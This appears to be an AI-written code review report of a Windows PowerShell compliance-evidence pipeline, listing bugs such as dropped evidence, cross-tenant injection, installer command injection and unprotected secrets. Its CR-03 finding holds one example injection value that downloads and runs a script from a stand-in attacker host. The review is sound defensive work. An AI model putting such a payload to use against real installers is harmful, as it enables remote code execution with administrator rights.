---
phase: 23-windows-powershell-evidence
reviewed: 2026-07-02T19:13:10Z
depth: standard
files_reviewed: 14
files_reviewed_list:
  - backend/powershell_evidence_endpoints.py
  - backend/tests/test_powershell_evidence.py
  - backend/router_registry.py
  - backend/agent_download_endpoints.py
  - backend/static/Collect-Evidence.ps1
  - agent/installer/Collect-Evidence.ps1
  - agent/installer/OmniAgent-Setup.iss
  - backend/static/win-install.ps1
  - agent-rust/install-service.ps1
  - agent/installer/install_agent.ps1
  - agent/installer/Configure-Agent.ps1
  - components/WindowsInstallTab.tsx
  - components/AgentInstallation.tsx
  - components/AssetComplianceList.tsx
findings:
  critical: 4
  warning: 8
  info: 4
  total: 16
status: issues_found
---

# Phase 23: Code Review Report

**Reviewed:** 2026-07-02T19:13:10Z
**Depth:** standard
**Files Reviewed:** 14
**Status:** issues_found

## Summary

This phase adds a Windows PowerShell compliance-evidence pipeline: a new ingestion endpoint
(`POST /api/powershell-evidence/submit`), a 28-check `Collect-Evidence.ps1` collector shipped in
two locations, several Windows service installers (win-install.ps1, install-service.ps1,
install_agent.ps1, Configure-Agent.ps1, an Inno Setup `.iss`), and frontend install/download UI.

The most severe finding (CR-01) is that the new endpoint builds its payload under the key
`"checks"` while the shared processor it calls (`process_automated_evidence` →
`compliance_evidence_processor.py`) only ever reads `"compliance_checks"` — a convention used
consistently everywhere else in the codebase. As written, **every PowerShell evidence
submission silently writes zero evidence records**; the endpoint still returns HTTP 200 with an
`"accepted"` count, so operators have no signal that data is being dropped. This is invisible to
the shipped test suite because the tests mock `process_automated_evidence` entirely.

A second critical issue (CR-02) is in the tenant-resolution logic shared with this new endpoint:
the authenticated tenant (resolved from the registration key / JWT) can be silently overridden by
a tenant looked up via the client-supplied `hostname`, which is not validated against the caller's
tenant at all. This allows a tenant to inject evidence attributed to a different tenant's asset by
choosing a colliding hostname.

Two further blockers were found in the Windows installer surface: an unescaped/unsanitized wizard
value spliced into a PowerShell `-Command` string in the Inno Setup script (command injection), and
an invalid PowerShell expression (`return if (...) {...} else {...}`) in `Configure-Agent.ps1` that
will fail to parse, aborting the entire configuration wizard before it runs.

Additional warnings cover duplicated evidence-collector scripts that must be hand-synced, secrets
written to disk without ACL protection in two of the four installers, unsigned/unverified binary
downloads executed as `LocalSystem`, a dead `asset_id` payload field, and a frontend tenant-id
inconsistency that can hide download buttons for some admins.

## Critical Issues

### CR-01: PowerShell evidence is silently dropped — wrong dict key used to call the shared processor

**File:** `backend/powershell_evidence_endpoints.py:86`
**Issue:**
The endpoint builds the payload passed into `process_automated_evidence` as:
```python
compliance_data = {"checks": [c.model_dump() for c in payload.checks]}
```
but `process_automated_evidence` (`backend/compliance_evidence_processor.py:272`) reads:
```python
for check in compliance_data.get("compliance_checks", []):
```
`"compliance_checks"` is the key used consistently everywhere else in the codebase
(`agent_tasks_endpoints.py:91/117`, `trigger_compliance_check.py:72/76`,
`live_agent_daemon.py:403`, `elevated_compliance_db_update.py:35/62`). Because the endpoint uses
`"checks"` instead, `compliance_data.get("compliance_checks", [])` always returns `[]`, the
processing loop body never executes, and **no `asset_compliance` evidence record is ever written**
for any PowerShell submission — regardless of how many checks were submitted or what their status
was. The endpoint still returns `200 {"accepted": N, ...}`, so this failure is completely silent
to both the agent script and any operator watching the API.

This also means the "PS" badge in `components/AssetComplianceList.tsx:162-166` (which checks
`ev.agent_type === 'powershell'`) can never render in production, and the entire Phase 23 feature
is non-functional end-to-end despite the unit tests passing (the tests mock
`process_automated_evidence`, so they never exercise the real key contract — see IN-04).
**Fix:**
```python
compliance_data = {"compliance_checks": [c.model_dump() for c in payload.checks]}
```
Add an integration-style test that calls the real (unmocked) `process_automated_evidence` with a
payload shaped like `PSEvidencePayload` and asserts an `asset_compliance` document is written —
this is exactly the class of bug that a fully-mocked test suite cannot catch.

### CR-02: Tenant resolution trusts client-supplied hostname over the authenticated tenant — cross-tenant evidence injection

**File:** `backend/compliance_evidence_processor.py:222-241` (invoked from `backend/powershell_evidence_endpoints.py:88-94`)
**Issue:**
`submit_powershell_evidence` authenticates the caller via `X-Registration-Key` (or JWT) and passes
the resolved tenant as `fallback_tenant_id`. But inside `process_automated_evidence`, the
*authenticated* tenant is only used as a last resort:
```python
asset_id = f"asset-{agent_hostname}"           # agent_hostname is fully client-controlled
asset = await db.assets.find_one({"id": asset_id})
tenant_id = asset.get("tenantId") if asset else None
if not tenant_id:
    agent = await db.agents.find_one({"hostname": agent_hostname})
    tenant_id = agent.get("tenantId") if agent else None
...
if not tenant_id and fallback_tenant_id:
    tenant_id = fallback_tenant_id
```
`hostname` in `PSEvidencePayload` (`powershell_evidence_endpoints.py:38`) has no format
constraint tying it to the caller's tenant. Any tenant holding a valid `X-Registration-Key` can
submit evidence with a `hostname` that collides with an asset/agent already registered under a
*different* tenant (e.g. common hostnames like `DESKTOP-01`, or a deliberately chosen collision),
and the evidence will be written under the other tenant's `tenantId` instead of the authenticated
caller's tenant — silently overriding the auth boundary the endpoint just enforced. The endpoint's
own response (`"tenant_id": tenant_id`, line 102) reports the *authenticated* tenant, which can
be different from the tenant the evidence was actually written under, so the caller isn't even
told the mismatch occurred.
**Fix:** In `process_automated_evidence`, when `fallback_tenant_id` is provided (i.e. the caller
was authenticated with a specific tenant context), it should take priority over hostname-derived
lookups, or at minimum the hostname-derived tenant must be checked against `fallback_tenant_id`
and rejected/logged on mismatch:
```python
if fallback_tenant_id:
    tenant_id = fallback_tenant_id
else:
    asset = await db.assets.find_one({"id": asset_id})
    tenant_id = asset.get("tenantId") if asset else None
    if not tenant_id:
        agent = await db.agents.find_one({"hostname": agent_hostname})
        tenant_id = agent.get("tenantId") if agent else None
```

### CR-03: Installer wizard input spliced unescaped into a PowerShell `-Command` string (command injection)

**File:** `agent/installer/OmniAgent-Setup.iss:60-62, 71-80, 85`
**Issue:** The wizard collects `Platform URL` and `Registration Key` via free-text
`TInputQueryWizardPage` fields (lines 60-62). The only validation performed is that the URL is
non-empty (`NextButtonClick`, lines 71-80) — no check for quote/backtick characters. These raw
values are then substituted via Inno Setup's `{code:GetApiUrl}` / `{code:GetRegKey}` directly into
a **single-quoted PowerShell string** embedded in a `-Command` argument:
```
Parameters: "-NonInteractive -ExecutionPolicy Bypass -Command ""$cfg = 'api_base_url: {code:GetApiUrl}' + ... "; Set-Content -Path '{app}\config.yaml' ... $cfg"""
```
Because Inno Setup does not escape single quotes for you, a value containing a single quote (e.g.
`http://x'; iwr evil.example/x.ps1|iex #`) breaks out of the PowerShell string literal and allows
arbitrary PowerShell to execute. The installer runs `PrivilegesRequired=admin`, so this executes
with administrator privileges. This is exploitable via social engineering (an attacker-provided
"platform URL" or "registration key" copy-pasted from a phishing doc/README) without the operator
realizing they are injecting a shell command, and it is a general robustness gap even absent
malicious intent (any URL/key containing a stray `'` breaks the installer silently or
unpredictably).
**Fix:** Escape single quotes by doubling them (PowerShell single-quote escaping) before
interpolation, e.g. add a Pascal helper:
```pascal
function PSEscape(S: String): String;
begin
  StringChangeEx(S, '''', '''''', True);
  Result := S;
end;
function GetApiUrl(Param: String): String;
begin Result := PSEscape(ConfigPage.Values[0]); end;
function GetRegKey(Param: String): String;
begin Result := PSEscape(ConfigPage.Values[1]); end;
```
and/or write the config via `Set-Content` with `-Value` built from an argument array rather than
string interpolation.

### CR-04: Invalid PowerShell syntax aborts the entire configuration wizard

**File:** `agent/installer/Configure-Agent.ps1:51`
**Issue:**
```powershell
$value = Read-Host -Prompt "  $prompt"
return if ($value) { $value } else { $default }
```
`return <expr>` requires a pipeline/expression; `if (...) {...} else {...}` is a **statement**, not
a valid pipeline element, and cannot follow `return` directly in PowerShell (unlike assignment,
e.g. `$x = if (...) {...} else {...}`, which is a documented, legal idiom). This is a parse-time
error ("Unexpected token 'if' in expression or statement."). PowerShell tokenizes/parses an entire
`.ps1` file before executing any of it, so this single malformed line causes the **whole script to
fail to run** — the banner, the "Existing config found" logic, the registration flow, all of it —
not just the `Prompt-Input` helper. This is the interactive first-run wizard referenced by
`install_agent.ps1`'s own guidance ("Run .\Configure-Agent.ps1 after installation..."), so the
documented configuration path is currently broken.
**Fix:**
```powershell
function Prompt-Input ([string]$label, [string]$default = "", [switch]$Secret) {
    $prompt = if ($default) { "$label [$default]" } else { $label }
    if ($Secret) {
        $secure = Read-Host -Prompt "  $prompt" -AsSecureString
        $bstr   = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        $plain  = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        return $plain
    }
    $value = Read-Host -Prompt "  $prompt"
    if ($value) { return $value }
    return $default
}
```

## Warnings

### WR-01: Collect-Evidence.ps1 exists as two manually-synced, byte-identical copies

**File:** `backend/static/Collect-Evidence.ps1` and `agent/installer/Collect-Evidence.ps1`
**Issue:** Both files are 337 lines and byte-for-byte identical (verified with `diff`). There is
no build step that generates one from the other — they are two independently committed copies.
Any future fix (including CR-01/CR-02's blast radius, or a new check) has to be applied twice by
hand; a partial update silently reintroduces drift between what `/api/agent/collect-evidence-script`
serves and what ships inside the installer/MSI/EXE bundle.
**Fix:** Keep a single source file (e.g. `agent/installer/Collect-Evidence.ps1`) and have the
backend build/serve step (`serve_collect_evidence_script` in `agent_download_endpoints.py`) read
from that canonical path, or add a CI check that diffs the two files and fails the build on drift.

### WR-02: `asset_id` accepted by the API but silently discarded

**File:** `backend/powershell_evidence_endpoints.py:39, 86-94`
**Issue:** `PSEvidencePayload.asset_id: Optional[str] = None` is defined and documented as part of
the request contract, but `submit_powershell_evidence` never reads `payload.asset_id` — it is not
forwarded to `process_automated_evidence`, which independently derives `asset_id =
f"asset-{agent_hostname}"` internally (`compliance_evidence_processor.py:222`). A client that sets
`asset_id` to associate evidence with a specific pre-existing asset record gets no such behavior;
the field is dead.
**Fix:** Either remove the unused field from the model (and the docstring/API surface) or thread it
through to `process_automated_evidence` and use it in place of the hostname-derived id when
present.

### WR-03: A single oversized check can drop an entire host's evidence batch

**File:** `backend/powershell_evidence_endpoints.py:33` (`evidence_content` `max_length=50000`); collectors in `agent/installer/Collect-Evidence.ps1` / `backend/static/Collect-Evidence.ps1` (e.g. `Check-AuditPolicy`, `Check-PasswordComplexity`)
**Issue:** `PSEvidencePayload.checks` is validated as a single list (`List[PSCheck]`); if any one
check's `evidence_content` (raw command output, e.g. `auditpol /get /category:*` or a full
`secedit /export` policy dump) exceeds 50,000 characters, Pydantic rejects the **entire** request
with 422 before any of the other 27 checks are processed. The PowerShell collector does no
truncation before submitting, so a verbose environment (large audit-policy output, many installed
programs, etc.) can silently fail the whole submission on some hosts, and the operator only sees a
generic PowerShell HTTP error, not which check caused it.
**Fix:** Truncate `evidence_content` client-side to a safe cap (e.g. first/last N KB with a marker)
before building the payload, and/or make the server tolerant of oversized fields for individual
checks (validate/truncate per-check server-side rather than rejecting the whole batch).

### WR-04: Registration key / secrets written to disk without restrictive ACLs in two of the four installers

**File:** `backend/static/win-install.ps1:126-135`; `agent-rust/install-service.ps1:123-136` (ACL only set on the binary at lines 181-192, not on `config.yaml`)
**Issue:** `config.yaml` (containing the plaintext `registration_key`) is written with
`Set-Content` and no explicit ACL. Under default NTFS permissions, `Program Files` grants
`Users`/`Authenticated Users` read access, so any non-admin local user can read the tenant
registration key from disk. By contrast, `agent/installer/install_agent.ps1:124-137` and
`agent/installer/Configure-Agent.ps1:261-269` *do* lock the config file down to
`SYSTEM`/`Administrators` only — the protection is inconsistent across the four installer
entry points shipped in this phase.
**Fix:** Apply the same `Get-Acl`/`SetAccessRuleProtection`/`Set-Acl` pattern used in
`install_agent.ps1` to `win-install.ps1` and `install-service.ps1` immediately after writing
`config.yaml`.

### WR-05: Agent binary/scripts downloaded and executed as SYSTEM with no signature or checksum verification

**File:** `backend/static/win-install.ps1:94-105, 138-146`; `agent-rust/install-service.ps1:140-147`
**Issue:** `Invoke-WebRequest -Uri $DownloadUrl -OutFile $TmpExe` fetches `omni-agent.exe` (and
separately `Collect-Evidence.ps1`) and then registers/starts it as a `LocalSystem` service with no
checksum, signature, or HTTPS-enforcement check. All documented examples use plain `http://`
(`http://192.168.1.100:5000`), so on a shared/untrusted network segment a MITM attacker can
substitute a malicious binary or evidence script that then runs with full SYSTEM privileges.
**Fix:** At minimum, verify a SHA-256 checksum served alongside the binary (e.g. from a
`/api/agent-updates/checksum` endpoint) before `Copy-Item`/service registration; longer-term,
enforce HTTPS for `$ApiUrl` in production installers and/or sign the binary and verify the
Authenticode signature before execution.

### WR-06: Download buttons can silently disappear for admins whose tenant is only known via `currentUser.tenantId`

**File:** `components/AgentInstallation.tsx:76, 123-187`
**Issue:** The component computes `effectiveTenantId = tenantId || currentUser?.tenantId` and uses
it to fetch the registration key (line 79-86) and to decide whether to show the
"select a tenant" / instructional message (lines 115-121) — explicitly to handle the case
(per the component's own comment at line 72-73) where "the Tenant Admin's tenant list is not
loaded in App.tsx for non-super-admins". However, `isFreeTierDownloadable` (line 187) and every
download handler (`_getDownloadToken`, `handleDownloadAgentZip`, `handleDownloadRustExe`,
`handleDownloadMsi`) all gate on the raw `tenantId` prop only (`if (!tenantId) return;`), not
`effectiveTenantId`. For exactly the class of user this file was already patched to support (Tenant
Admin without an explicit `tenantId` prop), the registration key and Windows install commands
render correctly, but the ZIP/MSI/Rust-EXE download buttons either don't render
(`isFreeTierDownloadable` is false) or silently no-op when clicked.
**Fix:** Use `effectiveTenantId` consistently for `isFreeTierDownloadable` and all download
handlers, e.g. `const effTenantId = tenantId || currentUser?.tenantId;` and reference it in place
of the bare `tenantId` in each handler and in `isFreeTierDownloadable`.

### WR-07: `handleBuildAndDownload` bypasses the download-token auth pattern used by every other download flow in the same feature

**File:** `components/WindowsInstallTab.tsx:68, 86, 90`
**Issue:** `AgentInstallation.tsx`'s three download handlers all call `_getDownloadToken()` first
(a one-time, tenant-scoped, short-lived token) before hitting `/api/agent/download/...`. In
contrast, `WindowsInstallTab.handleBuildAndDownload` calls `fetch(`${backendUrl}/api/agent-updates/build`,
{ method: 'POST' })` and later navigates to `${backendUrl}/api/agent-updates/download/OmniAgent-Setup.exe`
with no token, no `Authorization` header, and no tenant scoping in the request at all. Even if the
backend endpoint (not in this phase's file set) enforces its own auth, the inconsistency within the
same UI surface is a maintainability/security-review hazard — a reviewer checking "does every
download path require a token" would miss this one.
**Fix:** Route this build/download flow through the same `authFetch` + one-time-token pattern as
the other three download buttons, or document explicitly why `/api/agent-updates/*` uses a
different trust model.

### WR-08: Empty/missing tenant `id` field silently degrades to `tenant_id=None` instead of failing loudly

**File:** `backend/powershell_evidence_endpoints.py:62-73`
**Issue:** `resolved_tenant_id = tenant.get("id", "")` — if a tenant document is missing its `id`
field (e.g. only has Mongo `_id`), `resolved_tenant_id` becomes `""`. `tenant_id = resolved_tenant_id`
is then `""`, which is falsy. When passed to `process_automated_evidence` as `fallback_tenant_id=""`,
the check `if not tenant_id and fallback_tenant_id` also treats `""` as falsy, so the fallback is
silently skipped and evidence can end up written with `tenant_id=None` — untethered from any
tenant — instead of raising a clear error at the API boundary.
**Fix:** Treat a missing/empty `tenant.get("id")` as an auth failure (`raise HTTPException(500,
"Tenant record missing id")`) rather than propagating an empty string.

## Info

### IN-01: `content_hash` provides no real tamper detection

**File:** `backend/compliance_evidence_processor.py:333-342`; `agent/installer/Collect-Evidence.ps1:35-49`
**Issue:** The agent computes its own SHA-256 of the content it is about to submit and the server
merely recomputes the same hash from the same submitted content and compares — a compromised or
malicious agent can trivially produce a "matching" hash for fabricated content. The "✅ Verified" /
"❌ TAMPERING DETECTED" language displayed in evidence (`compliance_evidence_processor.py:337-341`)
overstates the guarantee this provides; it only detects accidental transport corruption between
agent and server, not tampering by the agent itself.
**Fix:** Document this limitation in the evidence record text (e.g. "content hash confirms
transport integrity only, not agent authenticity") to avoid misleading auditors reading the
generated evidence.

### IN-02: SecureString plaintext not zeroed after use

**File:** `agent/installer/Configure-Agent.ps1:47-48`
**Issue:** `[Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)` allocates unmanaged
memory containing the plaintext secret; the BSTR is never freed via
`[Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)`, leaving the plaintext token/key in
process memory longer than necessary.
**Fix:** Call `ZeroFreeBSTR($bstr)` immediately after extracting the plain string.

### IN-03: `Get-WmiObject` is deprecated/unavailable on PowerShell 7+

**File:** `agent/installer/install_agent.ps1:130`
**Issue:** `(Get-WmiObject Win32_OperatingSystem).Caption` relies on the WMI cmdlets that were
removed from PowerShell Core (7+); the script only works if invoked under Windows PowerShell 5.1.
Since other scripts in this phase (`win-install.ps1`, `install-service.ps1`) are written to be
version-agnostic, this is an inconsistency worth flagging even though `#Requires` isn't pinning a
PS edition here.
**Fix:** Use `Get-CimInstance Win32_OperatingSystem` instead, which works on both Windows
PowerShell and PowerShell 7+.

### IN-04: Test suite mocks out the exact function whose contract CR-01 violates

**File:** `backend/tests/test_powershell_evidence.py` (whole file)
**Issue:** Every test patches `powershell_evidence_endpoints.process_automated_evidence` with an
`AsyncMock`, so the suite verifies the endpoint *calls* the function with the right hostname/
`agent_type`, but never verifies the *shape* of `compliance_data` matches what the real function
expects. This is precisely why CR-01 (wrong dict key) shipped with all 6 tests green.
**Fix:** Add at least one test that imports the real `process_automated_evidence` (with a mocked
`db`) and asserts it produces an `asset_compliance` update from a `PSEvidencePayload`-shaped input,
closing the integration gap between this endpoint and its shared processor.

---

_Reviewed: 2026-07-02T19:13:10Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
